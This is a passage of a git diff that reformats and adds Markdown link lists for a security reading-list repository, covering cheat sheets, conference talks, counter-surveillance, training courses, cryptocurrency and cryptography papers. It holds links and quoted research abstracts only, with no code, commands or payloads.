 
+### Linux Cheat Sheets
 
-
-----------
-### <a name="ios">iOS Cheat Sheets</a>
-
-
-
-----------
-### <a name="Linux">Linux Cheat Sheets</a>
-**Linux Cheat Sheets**
 * [Linux Syscall Table](http://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html)
-	* Complete listing of all Linux Syscalls
 
+  * Complete listing of all Linux Syscalls
 
+### Windows Cheat Sheets
 
-
-----------
-### <a name="Windows">Windows Cheat Sheets</a>
-**Windows Cheat Sheets**
 * [Windows Startup Application Database](http://www.pacs-portal.co.uk/startup_content.php)
 
+### Exploitation Cheat Sheets
 
-
-----------
-### <a name="Exploitation">Exploitation Cheat Sheets</a>
-**Exploitation Cheat Sheets**
 * [AIX For Pentesters](http://www.giac.org/paper/gpen/6684/aix-penetration-testers/125890)
-	* Good paper on exploiting/pentesting AIX based machines. From the paper itself “ The paper proposes some basic methods to do comprehensive local security checks and how to exploit the vulnerabilities.”
+
+  * Good paper on exploiting/pentesting AIX based machines. From the paper
+    itself "The paper proposes some basic methods to do comprehensive local
+    security checks and how to exploit the vulnerabilities."
+
 * [Linux - Breaking out of shells](https://highon.coffee/docs/linux-commands/#breaking-out-of-limited-shells)
 * [RootVG - Website Dedicated to AIX](http://www.rootvg.net/content/view/102/98/)
 * [Windows Privilege Escalation Cheat Sheet/Tricks](http://it-ovid.blogspot.fr/2012/02/windows-privilege-escalation.html)
 
+### Exploit Dev Cheat Sheets
 
-
-
-----------
-### <a name="Exploitation">Exploit Dev Cheat Sheets</a>
-**Exploit Dev Cheat Sheets**
 * [x86 opcode structure and instruction overview](http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.pdf)
 * [Nasm x86 reference](https://www.cs.uaf.edu/2006/fall/cs301/support/x86/)
 
+### Metasploit Cheat Sheets
 
-----------
-### <a name="Metasploit">Metasploit Cheat Sheets</a>
-**Metasploit Cheat Sheets**
 * [Metasploit 4.2 documentation](https://community.rapid7.com/docs/DOC-1751)
 * [MSF Payload Cheat Sheet](http://aerokid240.blogspot.com/2009/11/msfpayload-goodness-cheatsheet.html)
 * [Metasploit Meterpreter Cheat Sheet](https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf)
 * [Tips & Tricks](https://en.wikibooks.org/wiki/Metasploit/Tips_and_Tricks)
 
+### Forensics/IR Cheat Sheets
 
-
-
-----------
-### <a name="For">Forensics/IR Cheat Sheets</a>
-**Forensics/IR Cheat Sheets**
 * [File Signature Table](http://www.garykessler.net/library/file_sigs.html)
 * [Mem forenics cheat sheet](http://forensicmethods.com/wp-content/uploads/2012/04/Memory-Forensics-Cheat-Sheet-v1.pdf)
 * [Security Incident Survey Cheat Sheet](https://zeltser.com/security-incident-survey-cheat-sheet/)
@@ -121,29 +91,24 @@ http://www.amanhardikar.com/mindmaps/Practice.html
 * [Critical Log Review Checklist for Security Incidents](https://zeltser.com/security-incident-log-review-checklist/)
 * [Network DDOS Incident Response Cheat Sheet](https://zeltser.com/ddos-incident-cheat-sheet/)
 
+### Malware Cheat Sheet
 
-----------
-### <a name="Malware">Malware Cheat Sheet</a>
-**Malware Cheat Sheets**
 * [Reverse Engineering Malware Cheat Sheet](https://zeltser.com/reverse-malware-cheat-sheet/)
 * [Analyzing Malicious Documents Cheat Sheet](https://zeltser.com/analyzing-malicious-documents/)
 
+### Reverse Engineering Cheat Sheets
 
-
-----------
-### <a name="RE">Reverse Engineering Cheat Sheets</a>
-**RE Cheat Sheets**
 * [Radare2 Cheat-Sheet](https://github.com/pwntester/cheatsheets/blob/master/radare2.md)
 * [WinDbg Cheat Sheet/mindmap](http://tylerhalfpop.com/2014/08/16/windbg-cheatsheet/)
 * [Pdf of all WinDbg commands](http://windbg.info/download/doc/pdf/WinDbg_cmds.pdf)
 * [Arm instruction set](http://simplemachines.it/doc/arm_inst.pdf)
 * [IdaRef](https://github.com/nologic/idaref)
-	* IDA Pro Full Instruction Reference Plugin - It's like auto-comments but useful.
 
+  * IDA Pro Full Instruction Reference Plugin - It's like auto-comments but
+    useful.
+
+### Web Cheat Sheets
 
-----------
-### <a name="Web">Web Cheat Sheets</a>
-**Web Cheat Sheets**
 * [Drupal Security Checklist](https://github.com/gfoss/attacking-drupal/blob/master/presentation/drupal-security-checklist.pdf)
 * [O-Auth Security Cheat Sheet](http://www.oauthsecurity.com/)
 * [OWASP Testing Checklist](https://www.owasp.org/index.php/Testing_Checklist)
@@ -151,13 +116,10 @@ http://www.amanhardikar.com/mindmaps/Practice.html
 * [SSRF Bible Cheatsheet](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit)
 * [WebAppSec Testing Checklist](http://tuppad.com/blog/wp-content/uploads/2012/03/WebApp_Sec_Testing_Checklist.pdf)
 
-----------
 ### Wireless Cheat Sheet
-**Wireless Cheat Sheets**
+
 * [Management Frames Reference Sheet](http://download.aircrack-ng.org/wiki-files/other/managementframes.pdf)
 
+### Database Cheat Sheets
 
-----------
-### <a name="DB">Database Cheat Sheets</a>
-**DB Cheat Sheets**
 * [Checklist for mongodb](http://blog.mongodirector.com/10-tips-to-improve-your-mongodb-security/)
diff --git a/Draft/Conferences.md b/source/Conferences.md
old mode 100755
new mode 100644
similarity index 60%
rename from Draft/Conferences.md
rename to source/Conferences.md
index 558f884..edc888e
--- a/Draft/Conferences.md
+++ b/source/Conferences.md
@@ -1,19 +1,27 @@
 # Information Security Conference Videos & Stuff
 
+### General
 
+* [You and Your Research - Haroon Meer](https://www.youtube.com/watch?v=JoVx_-bM8Tg)
 
+  * What does it take to do quality research? What stops you from being a
+    one-hit wonder? Is there an age limit to productive hackery? What are the
+    key ingredients needed and how can you up your chances of doing great work?
+    In a talk unabashedly stolen from far greater minds we hope to answer these
+    questions and discuss their repercussions.
 
------
-### General
-* [You and Your Research - Haroon Meer](https://www.youtube.com/watch?v=JoVx_-bM8Tg)
-	* What does it take to do quality research? What stops you from being a one-hit wonder? Is there an age limit to productive hackery? What are the key ingredients needed and how can you up your chances of doing great work? In a talk unabashedly stolen from far greater minds we hope to answer these questions and discuss their repercussions.
 * [A talk about (info-sec) talks - Haroon Meer ](https://www.youtube.com/watch?v=BlVjdUkrSFY)
-	* Last year there was an Information Security conference taking place for almost every day of the year. This translates to about 15 information security talks per day, every day. The question is, is this a bad thing? Even niche areas of the info-sec landscape have their own dedicated conference these days. Is this a good thing?
-* [List of Conferences](https://infosec-conferences.com/)
 
+  * Last year there was an Information Security conference taking place for
+    almost every day of the year. This translates to about 15 information
+    security talks per day, every day. The question is, is this a bad thing?
+    Even niche areas of the info-sec landscape have their own dedicated
+    conference these days. Is this a good thing?
+
+* [List of Conferences](https://infosec-conferences.com/)
 
------
 ### Archives of Talks
+
 * [IronGeek - Chances are he has it archived here](https://www.irongeek.com/)
 * [31st Chaos Communication Congress Archive](http://cdn.media.ccc.de/congress/31C3/)
 * [Shmoocon 2015 Videos](https://archive.org/details/shmoocon-2015-videos-playlist)
@@ -22,19 +30,9 @@
 * [Trooper Conference - 2015](https://www.youtube.com/channel/UCPY5aUREHmbDO4PtR6AYLfQ)
 * [Derbycon 2017 Videos](https://www.irongeek.com/i.php?page=videos/derbycon7/mainlist)
 
-
-
-
------
 ### Conferences/Events
 
-
------
 ### Slides/PDFs
+
 * [CanSecWest Vancouver 2015 Slides](https://cansecwest.com/csw15archive.html)
 * [SyScan2015 Slides](https://www.syscan.org/index.php/download)
-
-
-
-
-
diff --git a/source/Counter-Surveillance.md b/source/Counter-Surveillance.md
new file mode 100644
index 0000000..6b1cd2f
--- /dev/null
+++ b/source/Counter-Surveillance.md
@@ -0,0 +1,66 @@
+## Counter Surveillance
+
+I am not a professional and may be a twelve year old child. Be wary.
+
+#### ToC
+
+* Cull
+* [Guides/Write-ups](#guides)
+* [Videos/Presentations](#videos)
+* [Papers](#papers)
+
+### Guides/Write-ups
+
+* Detecting Surveillance - [Spiderlabs blog](http://blog.spiderlabs.com)
+
+  * [1 Hardware Implants](http://blog.spiderlabs.com/2014/03/detecting-surveillance-state-surveillance-part-1-hardware-impants.html)
+  * [2 Radio Frequency Exfiltration](http://blog.spiderlabs.com/2014/03/detecting-a-surveillance-state-part-2-radio-frequency-exfiltration.html)
+  * [3 Infected Firmware](http://blog.spiderlabs.com/2014/04/detecting-a-surveillance-state-part-3-infected-firmware.html)
+
+* [A Simple Guide to TSCM Sweeps](http://www.international-intelligence.co.uk/tscm-sweep-guide.html)
+
+### Videos
+
+* [F\*ck These Guys: Practical Countersurveillance Lisa Lorenzin - BsidesSF15](http://www.irongeek.com/i.php?page=videos/bsidessf2015/201-fck-these-guys-practical-countersurveillance-lisa-lorenzin)
+
+  * We've all seen the steady stream of revelations about the NSA's
+    unconstitutional, illegal mass surveillance. Seems like there's a new
+    transgression revealed every week! I'm getting outrage fatigue. So I decided
+    to fight back... by looking for practical, realistic, everyday actions I can
+    take to protect my privacy and civil liberties on the Internet, and sharing
+    them with my friends. Join me in using encryption and privacy technology to
+    resist eavesdropping and tracking, and to start to opt out of the bulk data
+    collection that the NSA has unilaterally decided to secretly impose upon the
+    world. Let's take back the Internet, one encrypted bit at a time.
+
+* [Dr. Philip Polstra - Am I Being Spied On?](https://www.youtube.com/watch?v=Bc7WoDXhcjM)
+
+  * Talk on cheap/free counter measures
+
+* [DNS May Be Hazardous to Your Health - Robert Stucke](https://www.youtube.com/watch?v=ZPbyDSvGasw)
+
+* Great talk on attacking DNS
+
+* [CounterStrike Lawful Interception](https://www.youtube.com/watch?v=7HXLaRWk1SM)
+
+  * This short talk will cover the standards, devices and implementation of a
+    mandatory part of our western Internet infrastructure. The central question
+    is whether an overarching interception functionality might actually put
+    national Internet infrastructure at a higher risk of being attacked
+    successfully. The question is approached in this talk from a purely
+    technical point of view, looking at how LI functionality is implemented by a
+    major vendor and what issues arise from that implementation. Routers and
+    other devices may get hurt in the process.
+  * [Slides](http://phenoelit.org/stuff/CSLI.pdf)
+
+### Papers
+
+* [Exploiting Lawful Intercept to Wiretap the Internet](https://www.blackhat.com/presentations/bh-dc-10/Cross_Tom/BlackHat-DC-2010-Cross-Attacking-LawfulI-Intercept-wp.pdf)
+
+  * This paper will review Cisco's architecture for lawful intercept from
+    asecurity perspective. We explain how a number of different weaknesses in
+    its design coupled with publicly disclosed security vulnerabilities could
+    enable a malicious person to access the interface and spy on communications
+    without leaving a trace. We then provide a set of recommendations for the
+    redesign of the interface as well as SNMP authentication in general to
+    better mitigate the security risks.
diff --git a/source/Courses-Training.md b/source/Courses-Training.md
new file mode 100644
index 0000000..bb1613b
--- /dev/null
+++ b/source/Courses-Training.md
@@ -0,0 +1,218 @@
+## Classes & Training
+
+### ToC
+
+* [Cull](#cull)
+* [General Security Classes](#general)
+* [General Sources/Repositories of Classes](#repo)
+* [Incident Response and Forensics Training](#ir)
+* [Penetration Testing Training](#pt)
+* [Programming Classes/Training](#prog)
+* [Reverse Engineering Classes/Training](#re)
+* [Exploitation Development Training](#exploit)
+* [UEFI/BIOS Training](#uefi)
+* [Web Security Focused Training](#web)
+* [Resources for instructors/Trainers](#resource)
+
+#### Cull
+
+* DVWA
+
+* Hackingdojo
+
+* BVWA
+
+## Heads Up
+
+These classes are all focused on computer/information security. If you're
+looking for online courses to learn material other than the mentioned, check out
+"coursera.com", Standford's online classes or MIT's online courses.
+
+* [Coursera](https://www.coursera.org/)
+* [MIT OpenCourseware](https://ocw.mit.edu/courses/)
+* [Standford](http://online.stanford.edu/courses)
+* [Udemy](https://www.udemy.com/courses/)
+
+### General Sources/Repository of Classes
+
+* [Hackr.io](http://hackr.io/)
+
+  * Share and discover the best programming tutorials and courses online.
+
+* [Open Security Training](https://www.opensecuritytraining.info)
+* [Class Central](https://www.class-central.com/)
+
+  * Search engine for MooCs
+
+### General Classes
+
+* [Learning How to Learn](https://www.coursera.org/learn/learning-how-to-learn)
+
+  * Free Coursera Course
+
+  * About this course: This course gives you easy access to the invaluable
+    learning techniques used by experts in art, music, literature, math,
+    science, sports, and many other disciplines. We’ll learn about the how the
+    brain uses two very different learning modes and how it encapsulates
+    (“chunks”) information. We’ll also cover illusions of learning, memory
+    techniques, dealing with procrastination, and best practices shown by
+    research to be most effective in helping you master tough subjects.
+
+* [ENISA CERT Exercises and Training](http://www.enisa.europa.eu/activities/cert/support/exercise)
+
+  * ENISA CERT Exercises and training material was introduced in 2008, in 2012
+    and 2013 it was complemented with new exercise scenarios containing
+    essential material for success in the CERT community and in the field of
+    information security. In this page you will find the ENISA CERT Exercise
+    material, containing Handbook for teachers, Toolset for students and Virtual
+    Image to support hands on training sessions.
+
+* [SEEDLabs](http://www.cis.syr.edu/~wedu/seed/all_labs.html)
+
+  * People learn from mistakes. In security education, we study mistakes that
+    lead to software vulnerabilities. Studying mistakes from the past not only
+    help students understand why systems are vulnerable, why a "seemly-benign"
+    mistake can turn into a disaster, and why many security mechanisms are
+    needed. More importantly, it also helps students learn the common patterns
+    of vulnerabilities, so they can avoid making similar mistakes in the future.
+    Moreover, using vulnerabilities as case studies, students can learn the
+    principles of secure design, secure programming, and security testing.
+
+* [Teach Yourself Computer Science](https://teachyourselfcs.com/)
+* [Technical Development Guide - Google](https://www.google.com/about/careers/students/guide-to-technical-development.html)
+* [OSS University - Computer Science](https://github.com/open-source-society/computer-science)
+
+  * Path to a free self-taught education in Computer Science!
+
+### Incident Response/Forensics/NSM Training
+
+* [Android Forensics & Security Testing - OpenSecurityTraining.info](http://opensecuritytraining.info/AndroidForensics.html)
+* [CS 259D Data Mining for Cyber Security Autumn 2014](http://web.stanford.edu/class/cs259d/)
+
+### Penetration Testing
+
+* [Pentester Lab](https://www.pentesterlab.com/)
+
+  * PentesterLab provides vulnerable systems that can be used to test and
+    understand vulnerabilities.
+
+* [FSU Offensive Security 2014](http://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/)
+
+  * Florida State University Offensive Security 2014 Class materials
+
+* [FSU Offensive Security 2013](http://www.cs.fsu.edu/~redwood/OffensiveSecurity/)
+
+  * Florida State University Offensive Security 2013 Class materials
+
+* [HackSplaining](https://www.hacksplaining.com/faq)
+
+  * Security training aimed towards developers. Free.
+
+### Programming Classes/Courses
+
+* [asm - 0xAX](https://github.com/0xAX/asm)
+
+* Learning assembly for linux-x64
+
+* [Introductory Intel x86: Architecture, Assembly, Applications, & Alliteration](http://opensecuritytraining.info/IntroX86.html)
+
+  * This class serves as a foundation for the follow on Intermediate level x86
+    class. It teaches the basic concepts and describes the hardware that
+    assembly code deals with. It also goes over many of the most common assembly
+    instructions. Although x86 has hundreds of special purpose instructions,
+    students will be shown it is possible to read most programs by knowing only
+    around 20-30 instructions and their variations.
+
+* [Win32 ASM tutorials - Iczelion](http://win32assembly.programminghorizon.com/tutorials.html)
+
+### Reverse Engineering
+
+* [Binary Auditing Training - Thorsten Schneider](http://www.binary-auditing.com/)
+
+  * The training package includes all necessary files to run a complete lecture
+    for Binary Auditing and Reverse Code Engineering at university. All files
+    are well sorted by topics and with increasing difficulty. You need Windows
+    XP, Windows Vista or Windows 7 to use this training package. The training
+    package does NOT include runnable viruses!
+
+* [exrs - Binary Exploitation/Reverse Engineering Challenge training](https://github.com/wapiflapi/exrs)
+
+  * Exercises for learning Reverse Engineering and Exploitation. All binaries
+    for these challenges are ELF 64-bit LSB executable, x86-64.
+
+* [mammon_'s tales to his grandson - Reverse Engineering](https://mammon.github.io/tales/)
+* [Software Modeling and Verification - Static Analysis](http://www-i2.informatik.rwth-aachen.de/i2/spa12/)
+* [The Life of Binaries](http://opensecuritytraining.info/LifeOfBinaries.html)
+
+  * Scanning and tokenizing source code.
+  * Parsing a grammar.
+  * Different targets for x86 assembly object files generation. (E.g.
+    relocatable vs. position independent code).
+  * Linking object files together to create a well-formed binary.
+  * Detailed descriptions of the high level similarities and low level
+    differences between the Windows PE and Linux ELF binary formats. (NOTE: we
+    didn't get to this in the class where the video was recorded, but the
+    materials are in the slides)
+    * How an OS loads a binary into memory and links it on the fly before
+      executing it.
+    * Along the way we discuss the relevance of security at different stages of
+      a binary’s life, from the tricks that can be played by a malicious
+      compiler, to how viruses really work, to the way which malware “packers”
+      duplicate OS process execution functionality, to the benefit of a
+      security-enhanced OS loader which implements address space layout
+      randomization (ASLR).
+
+* [Introduction to Reverse Engineering Software - Dartmouth](http://althing.cs.dartmouth.edu/local/www.acm.uiuc.edu/sigmil/RevEng/)
+* [CSCI 4974 / 6974 Hardware Reverse Engineering](http://security.cs.rpi.edu/courses/hwre-spring2014/)
+
+## Exploit Development Training
+
+* [exrs - Binary Exploitation/Reverse Engineering Challenge training](https://github.com/wapiflapi/exrs)
+
+  * Exercises for learning Reverse Engineering and Exploitation. All binaries
+    for these challenges are ELF 64-bit LSB executable, x86-64.
+
+* [BFH Exploiting & Defense Course - Dobin Rutishauser](https://blog.compass-security.com/2017/05/bfh-exploiting-defense-course/)
+* [Modern Binary Exploitation - CSCI 4968 - Spring '15](http://security.cs.rpi.edu/courses/binexp-spring2015/)
+
+  * The course will start off by covering basic x86 reverse engineering,
+    vulnerability analysis, and classical forms of Linux based userland binary
+    exploitation. It will then transitionin to protections found on modern
+    systems(Canaries, DEP, ASLR, RELRO, FortifySource, etc) and the techniques
+    used to defeat them.Time permitting, the course will also cover other
+    subjects in exploitation including kernel land and Windows based
+    exploitation.
+
+* [armpwn](https://github.com/saelo/armpwn)
+
+  * Repository to train/learn memory corruption exploitation on the ARM
+    platform. This is the material of a workshop I prepared for my CTF Team.
+
+* [BinTut](https://github.com/NoviceLive/bintut)
+
+  * Dynamic or live demonstration of classical exploitation techniques of
+    typical memory corruption vulnerabilities, from debugging to payload
+    generation and exploitation, for educational purposes
+
+### UEFI/BIOS Training
+
+* [firmware-security-training](https://github.com/advanced-threat-research/firmware-security-training)
+
+### Web Security Focused Training
+
+* [Google Gruyere - Web Application Exploits and Defenses ](http://google-gruyere.appspot.com/)
+
+### Data Science
+
+* [CS 259D Data Mining for Cyber Security Autumn 2014](http://web.stanford.edu/class/cs259d/)
+
+## Resources for Instructors and Trainers
+
+* [How To Give A Digital Security Training](https://medium.com/@geminiimatt/how-to-give-a-digital-security-training-4c83af667d40)
+* [LevelUP](https://www.level-up.cc/)
+
+  * Resources for the global digital safety training community.
+
+* [Be a Better Trainer](https://www.level-up.cc/you-the-trainer/be-a-better-trainer/)
+* [Teaching Evil - Chris Niemira](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t200-teaching-evil-chris-niemira)
+* [The Distribution of Users’ Computer Skills: Worse Than You Think](https://www.nngroup.com/articles/computer-skill-levels/)
diff --git a/source/Crypto-Currencies.md b/source/Crypto-Currencies.md
new file mode 100644
index 0000000..7c38792
--- /dev/null
+++ b/source/Crypto-Currencies.md
@@ -0,0 +1,49 @@
+## CryptoCurrencies
+
+ToC
+
+* [General](#general)
+* [Bitcoin](#bitcoin)
+* [Ethereum](#eth)
+* [Talks & Presentations](#talks)
+
+### General
+
+* [cryptocurrency](https://github.com/kilimchoi/cryptocurrency)
+
+  * Overview of top cryptocurrencies
+
+* [Blockchain Security research](https://gist.github.com/insp3ctre/403b8cb99eae2f52565874d8547fbc94)
+
+  * Open-source blockchain security research (contributions welcome!)
+
+### Bitcoin
+
+* [Bitcoin Paper](https://bitcoin.org/bitcoin.pdf)
+* [Bitcoin Paper Annotated - Genius](https://genius.com/2683753)
+* [Bitcoin Paper Annotated - Fermats Library](https://fermatslibrary.com/s/bitcoin)
+* [Bitcointalk](https://bitcointalk.org/)
+* [/r/bitcoin](https://reddit.com/r/bitcoin)
+
+### Ethereum
+
+* [Ethereum 'White Paper'](https://github.com/ethereum/wiki/wiki/White-Paper)
+* [Cracking the Ethereum White Paper](https://medium.com/@FolusoOgunlana/cracking-the-ethereum-white-paper-e0e60c44126)
+* [The Ether Thief](https://www.bloomberg.com/features/2017-the-ether-thief/)
+
+### Talks/Presentations
+
+* [Deanonymisation of Clients in Bitcoin P2P Network](http://orbilu.uni.lu/bitstream/10993/18679/1/Ccsfp614s-biryukovATS.pdf)
+
+  * We present an effcient method to deanonymize Bitcoin users, which allows to
+    link user pseudonyms to the IP addresses where the transactions are
+    generated. Our techniques work for the most common and the most challenging
+    scenario when users are behind NATs or rewalls of their ISPs. They allow to
+    link transactions of a user behind a NAT and to distinguish connections and
+    transactions of different users behind the same NAT. We also show that a
+    natural countermeasure of using Tor or other anonymity services can be cut-o
+    by abusing anti-DoS countermeasures of the Bitcoin network. Our attacks
+    require only a few machines and have been experimentally verifed. The
+    estimated success rate is between 11% and 60% depending on how stealthy an
+    attacker wants to be. We propose several countermeasures to mitigate these
+    new attacks.
diff --git a/source/Cryptography-Encryption.md b/source/Cryptography-Encryption.md
new file mode 100644
index 0000000..a13a77c
--- /dev/null
+++ b/source/Cryptography-Encryption.md
@@ -0,0 +1,424 @@
+## Cryptography
+
+##### TOC
+
+* [General Information](#general)
+* [Learning/Courses](#learn)
+* [Writeups](#write)
+* [Blogposts/Misc](#blog)
+* [Presentations](#presentation)
+* [Papers](#papers)
+* [Software](#soft)
+* [Stenography](#steno)
+* [Tools](#tools)
+* [Books](#books)
+* [Miscellaneous](#misc)
+
+### Cull
+
+* https://conversations.im/xeps/multi-end.html
+
+### General Information
+
+* [Quick'n easy gpg cheatsheet](http://irtfweb.ifa.hawaii.edu/%7Elockhart/gpg/)
+* [Website detailing various crypto laws around world](http://www.cryptolaw.org/)
+* [Snake Oil Crypto Competition](https://snakeoil.cr.yp.to/)
+* [XOR Bitwise Operations Explained - Khan Academy](https://www.khanacademy.org/computing/computer-science/cryptography/ciphers/a/xor-bitwise-operation)
+* [Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption)
+* [Differential Cryptanalysis for Dummies - Jon King](https://www.youtube.com/watch?v=xav-GUO_o4s&feature=youtu.be)
+* [Lifetimes of cryptographic hash functions](http://valerieaurora.org/hash.html)
+* [Top 10 Developer Crypto Mistakes](https://littlemaninmyhead.wordpress.com/2017/04/22/top-10-developer-crypto-mistakes/amp/)
+* [SSL/TLS and PKI History ](https://www.feistyduck.com/ssl-tls-and-pki-history/)
+
+  * A comprehensive history of the most important events that shaped the SSL/TLS
+    and PKI ecosystem. Based on Bulletproof SSL and TLS, by Ivan Ristic.
+
+* [Applied-Crypto-Hardening](https://github.com/BetterCrypto/Applied-Crypto-Hardening)
+
+  * Best Current Practices regarding secure online communication and
+    configuration of services using cryptography. https://bettercrypto.org
+
+### Courses:
+
+* [Coursera Cryptography]()
+* [Matsano Crypto Challenges](https://www.Cryptopals.co)
+
+  * Go through a series of increasingly difficult challenges while learning all
+    about cryptography. Expected knowledge level: You passed 9th grade math and
+    you have 0 knowledge of crypto.
+
+* [A Graduate Course in Applied Cryptography - Dan Boneh and Victor Shoup](http://toc.cryptobook.us/)
+
+  * Version 0.3 - posted Dec. 9, 2016
+
+* [Primer on Zero-Knowledge Proofs](http://blog.cryptographyengineering.com/2014/11/zero-knowledge-proofs-illustrated-primer.html?m=1)
+* [Hyper-encryption - Wikipedia](https://en.wikipedia.org/wiki/Hyper-encryption)
+
+### Writeups
+
+* [Attack of the week: FREAK (or 'factoring the NSA for fun and profit')](http://blog.cryptographyengineering.com/2015/03/attack-of-week-freak-or-factoring-nsa.html)
+* [An Empirical Study of Cryptographic Misuse in Android Applications](https://www.cs.ucsb.edu/~chris/research/doc/ccs13_cryptolint.pdf)
+* [Widespread Weak Keys in Network Devices](https://factorable.net/)
+* [Secrets and LIE-abilities: The State of Modern Secret Management (2017)](https://medium.com/on-docker/secrets-and-lie-abilities-the-state-of-modern-secret-management-2017-c82ec9136a3d)
+* [How to Implement Crypto Poorly - Sean Cassidy](https://github.com/cxxr/talks/blob/master/2016/grrcon/How%20to%20Implement%20Crypto%20Poorly.pdf)
+* [CBC Byte Flipping Attack—101 Approach](http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/)
+* [Demystifying the Signal Protocol for End-to-End Encryption (E2EE)](https://medium.com/@justinomora/demystifying-the-signal-protocol-for-end-to-end-encryption-e2ee-ad6a567e6cb4)
+* [A Formal Security Analysis of the Signal Messaging Protocol - Oct2016](https://eprint.iacr.org/2016/1013.pdf)
+* [Automated Padding Oracle Attacks with PadBuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)
+* [PadBuster v0.3 and the .NET Padding Oracle Attack](https://blog.gdssecurity.com/labs/2010/10/4/padbuster-v03-and-the-net-padding-oracle-attack.html)
+
+### Blogposts/Misc(doesnt explicitly fit in other sections)
+
+* [Encrypting Strings in Android: Let's make better mistakes](http://tozny.com/blog/encrypting-strings-in-android-lets-make-better-mistakes/)
+* [Poor Man's Guide to Troubleshooting TLS Failures](http://blogs.technet.com/b/tspring/archive/2015/02/23/poor-man-s-guide-to-troubleshooting-tls-failures.aspx)
+* [Top 10 Developer Crypto Mistakes](https://littlemaninmyhead.wordpress.com/2017/04/22/top-10-developer-crypto-mistakes/)
+* [cr.yp.to blog](http://blog.cr.yp.to/index.html)
+* [Recovering BitLocker Keys on Windows 8.1 and 10](https://tribalchicken.io/recovering-bitlocker-keys-on-windows-8-1-and-10/)
+* [Crypto.is Blog](https://crypto.is/blog/)
+
+  * This blog series is intended to be a course on how remailers work, the
+    theory behind them, and many of the choices that must be considered. Some of
+    the topics we intended to dive deeply into in the future is how to have a
+    directory of remailer nodes, how to handle messages that overflow the packet
+    size, more details on Mixminion, as-yet-unimplemented Academic Papers (like
+    Pynchon Gate and Sphinx), and more! Check out posts One, Two, Three, Four,
+    and Five. The comments section should work, so please do leave comments if
+    you have questions, insights, or corrections!
+
+### Presentations/Talks
+
+* [Crypto: 48 Dirty Little Secrets Cryptographers Don’t Want You To Know - BlackHat2014](https://www.youtube.com/watch?v=mXdFHNJ6srY)
+* [SHA2017 Conference Videos](https://www.youtube.com/channel/UCHmPMdU0O9P_W6I1hNyvBIQ/videos)
+* [Hunting For Vulnerabilities In Signal - Markus Vervier - HITB 2017 AMS](https://www.youtube.com/watch?v=2n9HmllVftA)
+
+  * Signal is the most trusted secure messaging and secure voice application,
+    recommended by Edward Snowden and the Grugq. And indeed Signal uses strong
+    cryptography, relies on a solid system architecture, and you’ve never heard
+    of any vulnerability in its code base. That’s what this talk is about:
+    hunting for vulnerabilities in Signal. We will present vulnerabilities found
+    in the Signal Android client, in the underlying Java libsignal library, and
+    in example usage of the C libsignal library. Our demos will show how these
+    can be used to crash Signal remotely, to bypass the MAC authentication for
+    certain attached files, and to trigger memory corruption bugs. Combined with
+    vulnerabilities in the Android system it is even possible to remotely brick
+    certain Android devices. We will demonstrate how to initiate a permanent
+    boot loop via a single Signal message. We will also describe the general
+    architecture of Signal, its attack surface, the tools you can use to analyze
+    it, and the general threat model for secure mobile communication apps.
+
+### Papers
+
+* [Get Your Hands Off My Laptop: Physical Side-Channel Key-Extraction Attacks On PCs](http://www.tau.ac.il/~tromer/handsoff/)
+
+  * We demonstrated physical side-channel attacks on a popular software
+    implementation of RSA and ElGamal, running on laptop computers. Our attacks
+    use novel side channels and are based on the observation that the "ground"
+    electric potential in many computers fluctuates in a computation-dependent
+    way. An attacker can measure this signal by touching exposed metal on the
+    computer's chassis with a plain wire, or even with a bare hand. The signal
+    can also be measured at the remote end of Ethernet, VGA or USB cables.
+    Through suitable cryptanalysis and signal processing, we have extracted
+    4096-bit RSA keys and 3072-bit ElGamal keys from laptops, via each of these
+    channels, as well as via power analysis and electromagnetic probing. Despite
+    the GHz-scale clock rate of the laptops and numerous noise sources, the full
+    attacks require a few seconds of measurements using Medium Frequency signals
+    (around 2 MHz), or one hour using Low Frequency signals (up to 40 kHz).
+
+* [Why does cryptographic software fail? A case study and open problems](http://pdos.csail.mit.edu/papers/cryptobugs:apsys14.pdf)
+
+  * Abstract: Mistakes in cryptographic software implementations often undermine
+    the strong security guarantees offered by cryptography. This paper presents
+    a systematic study of cryptographic vulnerabilities in practice, an
+    examination of state-of-the-art techniques to prevent such vulnerabilities,
+    and a discussion of open problems and possible future research directions.
+    Our study covers 269 cryptographic vulnerabilities reported in the CVE
+    database from January 2011 to May 2014. The results show that just 17% of
+    the bugs are in cryptographic libraries (which often have devastating
+    consequences), and the remaining 83% are misuses of cryptographic libraries
+    by individual applications. We observe that preventing bugs in different
+    parts of a system requires different techniques, and that no effective
+    techniques exist to deal with certain classes of mistakes, such as weak key
+    generation.
+
+* [RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis](http://www.tau.ac.il/~tromer/acoustic/)
+
+  * Here, we describe a new acoustic cryptanalysis key extraction attack,
+    applicable to GnuPG's current implementation of RSA. The attack can extract
+    full 4096-bit RSA decryption keys from laptop computers (of various models),
+    within an hour, using the sound generated by the computer during the
+    decryption of some chosen ciphertexts. We experimentally demonstrate that
+    such attacks can be carried out, using either a plain mobile phone placed
+    next to the computer, or a more sensitive microphone placed 4 meters away.
+
+* [Toward Robust Hidden Volumes Using Write-Only Oblivious RAM](https://eprint.iacr.org/2014/344.pdf)
+
+  * With sensitive data being increasingly stored on mobile devices and laptops,
+    hard disk encryption is more important than ever. In partic- ular, being
+    able to plausibly deny that a hard disk contains certain information is a
+    very useful and interesting research goal. However, it has been known for
+    some time that existing “hidden volume” so- lutions, like TrueCrypt, fail in
+    the face of an adversary who is able to observe the contents of a disk on
+    multiple, separate occasions. In this work, we explore more robust
+    constructions for hidden vol- umes and present HIVE, which is resistant to
+    more powerful ad- versaries with multiple-snapshot capabilities. In pursuit
+    of this, we propose the first security definitions for hidden volumes, and
+    prove HIVE secure under these definitions. At the core of HIVE, we de- sign
+    a new write-only Oblivious RAM. We show that, when only hiding writes, it is
